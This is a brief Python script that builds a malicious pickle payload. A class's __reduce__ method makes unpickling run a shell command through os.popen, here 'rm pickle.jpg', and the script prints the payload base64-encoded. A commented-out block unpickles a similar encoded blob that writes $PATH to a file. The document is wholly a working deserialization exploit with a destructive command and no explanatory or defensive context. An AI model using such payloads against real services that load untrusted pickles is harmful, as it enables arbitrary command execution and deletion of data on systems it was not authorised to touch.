'''
import pickle
import base64
byte = base64.b64decode('gASVKQAAAAAAAACMAm9zlIwFcG9wZW6Uk5SMEmVjaG8gJFBBVEggPiBvLnR4dJSFlFKULg==')
print(byte)
tmp = pickle.loads(byte)
print(tmp)
'''

import pickle
import base64


class MMM(object):
    def __reduce__(self):
        import os
        s = "rm pickle.jpg"
        return (os.popen, (s,))

payload = pickle.dumps(MMM())
load = base64.b64encode(payload)
print(load)

